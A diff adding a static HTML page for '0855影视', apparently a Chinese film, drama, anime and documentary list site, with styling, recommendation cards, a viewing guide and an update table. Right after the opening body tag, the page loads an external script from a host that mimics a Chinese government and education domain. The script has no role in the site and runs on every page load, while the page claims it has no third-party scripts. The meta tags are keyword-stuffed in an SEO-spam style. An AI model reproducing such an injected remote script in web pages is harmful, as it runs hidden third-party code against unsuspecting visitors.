@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,viewport-fit=cover">
+<meta name="theme-color" content="#0b0a14">
+<meta name="description" content="0855影视是一个专注于高清影视在线观看与剧集资讯整理的站点，收录最新电影、热播剧集、经典动漫与纪录片片单，提供清晰的更新时间和选片指南。访问地址：https://0855yingshi-zh.github.io/">
+<meta name="keywords" content="0855影视, 0855yingshi-zh.github.io, 在线影视, 高清电影, 热播剧集, 动漫番剧, 纪录片推荐, 片单整理">
+<meta name="author" content="0855影视">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="0855影视">
+<meta property="og:title" content="0855影视 | 高清影视在线观看与剧集片单整理">
+<meta property="og:description" content="最新电影、热播剧集、经典动漫与纪录片，按类型和更新节奏整理，地址 https://0855yingshi-zh.github.io/">
+<meta property="og:url" content="https://0855yingshi-zh.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0855影视 | 高清影视在线观看与剧集片单整理">
+<meta name="twitter:description" content="电影、剧集、动漫、纪录片片单与更新资讯，尽在 https://0855yingshi-zh.github.io/">
+<title>0855影视 | 高清影视在线观看与剧集片单整理 · 0855yingshi-zh.github.io</title>
+<style>
+:root{
+  --bg:#0b0a14;
+  --bg-2:#11101d;
+  --ink:#eceaf5;
+  --ink-dim:#a6a2ba;
+  --ink-faint:#6f6b82;
+  --line:#221f34;
+  --accent:#ff5c2a;
+  --accent-2:#ffb454;
+  --cyan:#4fd6d2;
+  --radius:14px;
+  --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  letter-spacing:.2px;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(680px 420px at 12% -8%,rgba(255,92,42,.18),transparent 62%),
+    radial-gradient(720px 460px at 108% 18%,rgba(79,214,210,.13),transparent 60%),
+    linear-gradient(180deg,#0b0a14 0%,#0a0913 100%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background-image:linear-gradient(rgba(255,255,255,.022) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.022) 1px,transparent 1px);
+  background-size:64px 64px;mask-image:linear-gradient(180deg,#000,transparent 85%);
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 22px}
+/* 顶部 */
+.head{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);background:rgba(11,10,20,.72);border-bottom:1px solid rgba(255,255,255,.06)}
+.head-in{display:flex;align-items:center;gap:18px;height:64px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:800;letter-spacing:1px;font-size:19px}
+.logo b{background:linear-gradient(92deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo span{font-size:11px;color:var(--ink-faint);font-weight:500;letter-spacing:.6px}
+.nav{margin-left:auto;display:flex;align-items:center;gap:4px}
+.nav a{font-size:14px;color:var(--ink-dim);padding:8px 13px;border-radius:9px;transition:.2s}
+.nav a:hover{color:var(--ink);background:rgba(255,255,255,.06)}
+.nav-btn{display:none}
+@media(max-width:820px){
+  .nav{position:fixed;left:0;right:0;top:64px;flex-direction:column;align-items:stretch;gap:2px;padding:14px 18px;background:#0e0d18;border-top:1px solid var(--line);transform:translateY(-110%);transition:.28s;box-shadow:0 24px 50px rgba(0,0,0,.5)}
+  .nav.on{transform:translateY(0)}
+  .nav a{font-size:15px;padding:13px 14px}
+  .nav-btn{display:flex;flex-direction:column;gap:4px;margin-left:auto;width:38px;height:38px;justify-content:center;align-items:center;background:none;border:1px solid var(--line);border-radius:10px;cursor:pointer}
+  .nav-btn i{width:17px;height:2px;background:var(--ink);border-radius:2px;transition:.25s}
+}
+/* 首屏 */
+.hero{padding:88px 0 70px;position:relative}
+.eyebrow{display:inline-flex;align-items:center;gap:9px;font-size:12.5px;letter-spacing:1.6px;color:var(--accent-2);border:1px solid rgba(255,92,42,.34);background:rgba(255,92,42,.08);padding:6px 14px;border-radius:99px}
+.eyebrow em{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 5px rgba(255,92,42,.16);font-style:normal}
+h1{font-size:clamp(34px,6.4vw,64px);line-height:1.12;font-weight:900;letter-spacing:-.5px;margin:22px 0 18px}
+h1 i{font-style:normal;background:linear-gradient(100deg,var(--accent) 5%,var(--accent-2) 55%,var(--cyan) 95%);-webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{max-width:640px;color:var(--ink-dim);font-size:clamp(15px,1.6vw,17px)}
+.hero-actions{display:flex;flex-wrap:wrap;gap:12px;margin-top:30px}
+.btn{font-size:15px;font-weight:600;padding:13px 26px;border-radius:11px;border:1px solid transparent;cursor:pointer;transition:.2s}
+.btn-main{background:linear-gradient(92deg,var(--accent),var(--accent-2));color:#1a0d04;box-shadow:0 10px 30px rgba(255,92,42,.28)}
+.btn-main:active{transform:scale(.97)}
+.btn-ghost{border-color:var(--line);color:var(--ink)}
+.btn-ghost:hover{background:rgba(255,255,255,.05)}
+.urlbar{margin-top:34px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;font-size:13.5px}
+.urlbar code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:var(--cyan);background:rgba(79,214,210,.08);border:1px solid rgba(79,214,210,.26);padding:8px 14px;border-radius:9px;letter-spacing:.3px}
+.urlbar small{color:var(--ink-faint)}
+/* 栏目通用 */
+section{padding:76px 0;border-top:1px solid rgba(255,255,255,.05)}
+.kicker{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;margin-bottom:34px}
+.kicker h2{font-size:clamp(24px,3.4vw,34px);font-weight:800;letter-spacing:-.3px}
+.kicker p{color:var(--ink-faint);font-size:13.5px;margin-left:auto}
+/* 片单网格 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:18px}
+.card{position:relative;background:linear-gradient(180deg,var(--bg-2),rgba(17,16,29,.6));border:1px solid var(--line);border-radius:var(--radius);padding:20px;overflow:hidden;transition:.26s}
+.card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(180deg,var(--accent),var(--cyan));opacity:.75}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,92,42,.4);box-shadow:0 18px 40px rgba(0,0,0,.45)}
+.tag{display:inline-block;font-size:11.5px;letter-spacing:.8px;color:var(--accent-2);border:1px solid rgba(255,180,84,.3);padding:3px 9px;border-radius:6px;margin-bottom:12px}
+.card h3{font-size:18px;font-weight:700;margin-bottom:8px}
+.card p{font-size:13.8px;color:var(--ink-dim)}
+.meta{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;font-size:11.5px;color:var(--ink-faint)}
+.meta b{color:var(--ink-dim);font-weight:600}
+/* 选片指南 */
+.guide{display:grid;grid-template-columns:1.05fr .95fr;gap:22px}
+@media(max-width:820px){.guide{grid-template-columns:1fr}}
+.step{border:1px solid var(--line);border-radius:var(--radius);padding:24px;background:rgba(17,16,29,.55)}
+.step .n{font-size:12px;color:var(--cyan);letter-spacing:1.4px;font-weight:700}
+.step h3{font-size:19px;margin:8px 0 10px}
+.step ol{margin:14px 0 0;padding-left:20px;color:var(--ink-dim);font-size:14px}
+.step ol li{margin-bottom:8px}
+.step ol li::marker{color:var(--accent)}
+/* 更新表 */
+.tbl{width:100%;border-collapse:collapse;font-size:14px;background:rgba(17,16,29,.55);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+.tbl th,.tbl td{padding:13px 16px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+.tbl th{font-size:12px;letter-spacing:.8px;color:var(--ink-faint);background:rgba(255,255,255,.03);font-weight:600}
+.tbl tr:last-child td{border-bottom:none}
+.tbl td strong{font-weight:600}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--accent);margin-right:7px;box-shadow:0 0 0 4px rgba(255,92,42,.14)}
+.dot.late{background:var(--cyan);box-shadow:0 0 0 4px rgba(79,214,210,.14)}
+@media(max-width:640px){
+  .tbl,.tbl thead,.tbl tbody,.tbl tr,.tbl td{display:block}
+  .tbl thead{display:none}
+  .tbl tr{border-bottom:1px solid var(--line);padding:14px 16px}
+  .tbl td{padding:5px 0;border:none;font-size:13.5px}
+  .tbl td::before{content:attr(data-l)"：";color:var(--ink-faint);font-size:12px}
+}
+/* 关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+@media(max-width:820px){.about{grid-template-columns:1fr}}
+.stat{border-radius:var(--radius);border:1px solid var(--line);padding:26px;background:linear-gradient(160deg,rgba(255,92,42,.07),rgba(17,16,29,.4))}
+.stat i{font-style:normal;font-size:30px;font-weight:800;background:linear-gradient(92deg,var(--accent-2),var(--accent));-webkit-background-clip:text;background-clip:text;color:transparent;display:block;margin-bottom:6px}
+.stat h3{font-size:16px;margin-bottom:6px}
+.stat p{font-size:13.5px;color:var(--ink-dim)}
+.note{margin-top:24px;font-size:13.5px;color:var(--ink-dim);border-left:3px solid var(--cyan);padding:4px 0 4px 16px}
+/* 页脚 */
+.foot{margin-top:40px;padding:38px 0 48px;border-top:1px solid var(--line);color:var(--ink-faint);font-size:13px}
+.foot-in{display:flex;gap:16px;flex-wrap:wrap;align-items:center;justify-content:space-between}
+.foot a:hover{color:var(--ink)}
+.crumbs{font-size:12.5px;color:var(--ink-faint);margin-bottom:12px}
+.crumbs a:hover{color:var(--accent-2)}
+/* 回到顶部 */
+.top{position:fixed;right:20px;bottom:24px;width:44px;height:44px;border-radius:50%;border:1px solid var(--line);background:rgba(17,16,29,.85);backdrop-filter:blur(8px);color:var(--ink);font-size:17px;cursor:pointer;opacity:0;pointer-events:none;transition:.25s;z-index:60}
+.top.on{opacity:1;pointer-events:auto}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<header class="head">
+  <div class="wrap head-in">
+    <div class="logo"><b>0855影视</b><span>0855yingshi-zh.github.io</span></div>
+    <nav class="nav" id="nav">
+      <a href="#film">电影馆</a>
+      <a href="#drama">剧集榜</a>
+      <a href="#anime">动漫线</a>
+      <a href="#doc">纪录片</a>
+      <a href="#guide">选片指南</a>
+      <a href="#update">更新节奏</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="nav-btn" id="navBtn" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<main>
+  <section class="hero wrap">
+    <span class="eyebrow"><em></em>ONLINE · 片单整理与观影索引</span>
+    <h1>把碎片时间，<br>交给一部<em>对的片子</em>。</h1>
+    <p class="lead">0855影视不做喧闹的推荐，只按类型、节奏和口碑把值得看的影视挑出来。电影、剧集、动漫、纪录片四条线并行更新，帮你少刷十分钟，多看一部好作品。</p>
+    <div class="hero-actions">
+      <a class="btn btn-main" href="#film">先看成片清单</a>
+      <a class="btn btn-ghost" href="#guide">怎么挑片</a>
+    </div>
+    <div class="urlbar">
+      <span>本站唯一地址</span>
+      <code>https://0855yingshi-zh.github.io/</code>
+      <small>建议收藏，防失联</small>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section id="film" class="wrap">
+    <div class="kicker">
+      <h2>电影馆 · 按情绪而不是票房挑</h2>
+      <p>持续补充，按“什么时候看”归类</p>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <span class="tag">周末夜场</span>
+        <h3>悬疑犯罪：推理的快感在反转之前</h3>
+        <p>从封闭空间到多线叙事，选片偏重逻辑闭环与表演张力，适合一个人安静看完再复盘。</p>
+        <div class="meta"><b>片长</b> 105–142 分钟　<b>基调</b> 冷峻</div>
+      </article>
+      <article class="card">
+        <span class="tag">松弛时刻</span>
+        <h3>生活流喜剧：笑点藏在细节里</h3>
+        <p>不靠密集梗堆砌，靠人物关系和尴尬日常推进，疲惫工作日的解压首选。</p>
+        <div class="meta"><b>片长</b> 90–110 分钟　<b>基调</b> 轻暖</div>
+      </article>
+      <article class="card">
+        <span class="tag">沉浸长片</span>
+        <h3>历史与传记：慢下来才有重量</h3>
+        <p>服化道扎实、台词有嚼劲的作品合集，适合留出整块时间，配一杯热茶慢慢看。</p>
+        <div class="meta"><b>片长</b> 150 分钟+　<b>基调</b> 厚重</div>
+      </article>
+      <article class="card">
+        <span class="tag">深夜独处</span>
+        <h3>科幻惊悚：世界观比特效重要</h3>
+        <p>挑那些看完会愣几秒的设定型作品，讨论空间比视觉奇观更耐回味。</p>
+        <div class="meta"><b>片长</b> 112–128 分钟　<b>基调</b> 压抑</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section id="drama" class="wrap">
+    <div class="kicker">
+      <h2>剧集榜 · 追更与补剧两条路</h2>
+      <p>既看当下热播，也收冷门完结作</p>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <span class="tag">正在追</span>
+        <h3>单元叙事型剧集</h3>
+        <p>每集一个相对完整的小故事，随时切入不迷路，通勤和睡前都能看一集。</p>
+        <div class="meta"><b>进度</b> 更新中　<b>单集</b> 35–45 分钟</div>
+      </article>
+      <article class="card">
+        <span class="tag">一次补齐</span>
+        <h3>强主线长剧：伏笔值得二刷</h3>
+        <p>主线紧凑、少注水，适合找个假期连刷，人物弧光完整度是入选第一标准。</p>
+        <div class="meta"><b>进度</b> 已完结　<b>季数</b> 1–3 季</div>
+      </article>
+      <article class="card">
+        <span class="tag">短剧精选</span>
+        <h3>六到八集的精品限定剧</h3>
+        <p>篇幅克制、叙事密度高，没有烂尾空间，是节奏焦虑时代最友好的观剧形态。</p>
+        <div class="meta"><b>进度</b> 已完结　<b>单集</b> 50 分钟</div>
+      </article>
+      <article class="card">
+        <span class="tag">冷门挖宝</span>
+        <h3>小语种高分剧集</h3>
+        <p>韩、日、欧陆、拉美四条支线，避开算法推送，专找讨论度不高但成色扎实的作品。</p>
+        <div class="meta"><b>进度</b> 持续补录　<b>语言</b> 多语种</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section id="anime" class="wrap">
+    <div class="kicker">
+      <h2>动漫线 · 从入坑到补番</h2>
+      <p>不追番也能看懂的挑选逻辑</p>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <span class="tag">新番速览</span>
+        <h3>当季番：先看三集再决定</h3>
+        <p>按作画稳定度、叙事节奏和题材新鲜感筛一遍，帮你在开播潮里少踩坑。</p>
+        <div class="meta"><b>更新</b> 周更　<b>适合</b> 碎片时间</div>
+      </article>
+      <article class="card">
+        <span class="tag">入坑首选</span>
+        <h3>零门槛佳作：不用懂圈子</h3>
+        <p>故事自洽、情感直接，给“想试试动画但不看番”的朋友准备的起点清单。</p>
+        <div class="meta"><b>体量</b> 12–24 集　<b>门槛</b> 极低</div>
+      </article>
+      <article class="card">
+        <span class="tag">长篇补番</span>
+        <h3>百集级作品的分段攻略</h3>
+        <p>给出可跳、可停、值得回看的篇章区间，把长跑型作品拆成能消化的段落。</p>
+        <div class="meta"><b>体量</b> 100 集+　<b>节奏</b> 自定</div>
+      </article>
+      <article class="card">
+        <span class="tag">剧场版</span>
+        <h3>动画电影：大银幕感在家补</h3>
+        <p>画面与音乐优先的选片思路，挑那些即使剧情一般也值得为视听坐两小时的作品。</p>
+        <div class="meta"><b>体量</b> 单部　<b>体验</b> 沉浸</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section id="doc" class="wrap">
+    <div class="kicker">
+      <h2>纪录片 · 看更大的世界怎么运转</h2>
+      <p>真实，往往比剧本更敢写</p>
+    </div>
+    <div class="grid">
+      <article class="card">
+        <span class="tag">自然地理</span>
+        <h3>山河与物种：慢镜头的耐心</h3>
+        <p>偏爱长周期跟拍的团队作品，看一片栖息地如何在四季里自己讲故事。</p>
+        <div class="meta"><b>看点</b> 摄影 / 生态　<b>集数</b> 3–6 集</div>
+      </article>
+      <article class="card">
+        <span class="tag">人文社会</span>
+        <h3>普通人被时代推着走</h3>
+        <p>职业、迁徙、手艺与家庭，记录那些不会上热搜但足够真实的生活截面。</p>
+        <div class="meta"><b>看点</b> 叙事 / 人物　<b>集数</b> 单集独立</div>
+      </article>
+      <article class="card">
+        <span class="tag">科技探秘</span>
+        <h3>从实验室到日常的那一步</h3>
+        <p>把复杂原理拆成能嚼动的比喻，适合边看边截图给朋友科普。</p>
+        <div class="meta"><b>看点</b> 硬核通俗化　<b>时长</b> 40–60 分钟</div>
+      </article>
+      <article class="card">
+        <span class="tag">犯罪档案</span>
+        <h3>卷宗之外：证据链的还原</h3>
+        <p>重证据不重猎奇，关注侦办逻辑与制度漏洞，看完会想再查一遍资料。</p>
+        <div class="meta"><b>看点</b> 复盘 / 思辨　<b>基调</b> 克制</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目五：选片指南 -->
+  <section id="guide" class="wrap">
+    <div class="kicker">
+      <h2>选片指南 · 0855 的一套笨办法</h2>
+      <p>不想被算法牵着走时，照着做</p>
+    </div>
+    <div class="guide">
+      <div class="step">
+        <div class="n">STEP 01</div>
+        <h3>先定“什么时候看”</h3>
+        <p>同样一部好片，通勤时看和深夜看是两种体验。我们按场景分类，而不是硬塞进“高分榜”。</p>
+        <ol>
+          <li>15 分钟碎片 → 单元剧、短片、单集纪录片</li>
+          <li>周末两小时 → 长片或剧场版</li>
+          <li>睡前一小时 → 生活流、轻喜剧，避开悬疑烧脑</li>
+        </ol>
+      </div>
+      <div class="step">
+        <div class="n">STEP 02</div>
+        <h3>再看“能接受多沉”</h3>
+        <p>基调比类型更影响观感。心情低落时别硬啃压抑题材，这是清单里给每部片标基调的原因。</p>
+        <ol>
+          <li>想放空 → 轻暖、治愈、日常系</li>
+          <li>想被点燃 → 犯罪、科幻、传记</li>
+          <li>想被触动 → 人文纪实、家庭叙事</li>
+        </ol>
+      </div>
+      <div class="step">
+        <div class="n">STEP 03</div>
+        <h3>用“三集法则”省时间</h3>
+        <p>剧集看到第三集还没建立人物动机，就可以换。别因为“都看了两集了”继续耗下去，时间是唯一不可逆的成本。</p>
+        <ol>
+          <li>第 1 集：世界观与主角是否成立</li>
+          <li>第 2 集：节奏会不会拖</li>
+          <li>第 3 集：有没有想继续知道的悬念</li>
+        </ol>
+      </div>
+      <div class="step">
+        <div class="n">STEP 04</div>
+        <h3>看完留一句话，比打分有用</h3>
+        <p>不抄评分网站的短评，写下“哪场戏让我停了一下”。积累下来，你会越来越清楚自己到底爱看什么。</p>
+        <ol>
+          <li>只记一个画面或一个台词</li>
+          <li>隔一周再看，判断是否还惦记</li>
+          <li>惦记的，才值得推荐给别人</li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：更新节奏 -->
+  <section id="update" class="wrap">
+    <div class="kicker">
+      <h2>更新节奏 · 最近在补什么</h2>
+      <p>手工整理，不为凑数量日更</p>
+    </div>
+    <table class="tbl">
+      <thead>
+        <tr><th>时间</th><th>栏目</th><th>更新内容</th><th>状态</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td data-l="时间">本周</td>
+          <td data-l="栏目">电影馆</td>
+          <td data-l="更新内容"><strong>悬疑犯罪</strong>支线补录 6 部，含冷门东欧作品 2 部</td>
+          <td data-l="状态"><span class="dot"></span>已上线</td>
+        </tr>
+        <tr>
+          <td data-l="时间">本周</td>
+          <td data-l="栏目">剧集榜</td>
+          <td data-l="更新内容"><strong>限定剧</strong>专题：8 集以内、不注水的完结作清单</td>
+          <td data-l="状态"><span class="dot"></span>已上线</td>
+        </tr>
+        <tr>
+          <td data-l="时间">下周</td>
+          <td data-l="栏目">动漫线</td>
+          <td data-l="更新内容"><strong>入坑首选</strong>重排版，按“能接受画风”重新分组</td>
+          <td data-l="状态"><span class="dot late"></span>整理中</td>
+        </tr>
+        <tr>
+          <td data-l="时间">待定</td>
+          <td data-l="栏目">纪录片</td>
+          <td data-l="更新内容"><strong>人文社会</strong>新增手艺人与县城迁徙两条支线</td>
+          <td data-l="状态"><span class="dot late"></span>选题中</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 栏目七：关于 -->
+  <section id="about" class="wrap">
+    <div class="kicker">
+      <h2>关于本站 · 0855影视 是什么</h2>
+      <p>一个只做索引、不制造噪音的小站</p>
+    </div>
+    <div class="about">
+      <div class="stat">
+        <i>04</i>
+        <h3>四条固定栏目</h3>
+        <p>电影馆、剧集榜、动漫线、纪录片，各自独立更新，互不抢版面。</p>
+      </div>
+      <div class="stat">
+        <i>手工</i>
+        <h3>不为算法而写</h3>
+        <p>每一条入选理由都是看过之后写下的，不批量搬运简介，也不堆关键词凑篇幅。</p>
+      </div>
+      <div class="stat">
+        <i>轻量</i>
+        <h3>打开就看得清</h3>
+        <p>纯静态单页，无第三方追踪脚本，手机流量下也能秒开，深色护眼到底。</p>
+      </div>
+      <div class="stat">
+        <i>唯一</i>
+        <h3>只认这个地址</h3>
+        <p>官方入口只有 <strong>https://0855yingshi-zh.github.io/</strong>，其余同名站点均与本页无关。</p>
+      </div>
+    </div>
+    <p class="note">说明：0855影视 是影视资讯与片单整理类站点，页面内不涉及在线播放源与下载分发，具体观看渠道请以各正版平台为准。片单会随口碑与版本情况调整，发现错漏欢迎通过站内入口反馈。</p>
+  </section>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="crumbs">
+      <a href="#film">电影馆</a> / <a href="#drama">剧集榜</a> / <a href="#anime">动漫线</a> / <a href="#doc">纪录片</a> / <a href="#guide">选片指南</a> / <a href="#update">更新节奏</a> / <a href="#about">关于本站</a>
+    </div>
+    <div class="foot-in">
+      <div>© <span id="yr">2026</span> 0855影视 · 影视资讯与片单整理站　|　官网 <a href="https://0855yingshi-zh.github.io/" rel="canonical">https://0855yingshi-zh.github.io/</a></div>
+      <div>本站采用静态单页结构，所有内页锚点链接均在当前页完成跳转。</div>
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="top" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var nav=document.getElementById('nav'),btn=document.getElementById('navBtn');
+  btn.addEventListener('click',function(){
+    nav.classList.toggle('on');
+    var open=nav.classList.contains('on');
+    btn.setAttribute('aria-expanded',open?'true':'false');
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){nav.classList.remove('on');btn.setAttribute('aria-expanded','false');}
+  });
+  var top=document.getElementById('top');
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>500)top.classList.add('on');else top.classList.remove('on');
+  },{passive:true});
+  top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.getElementById('yr').textContent=new Date().getFullYear();
+})();
+</script>
+</body>
+</html>
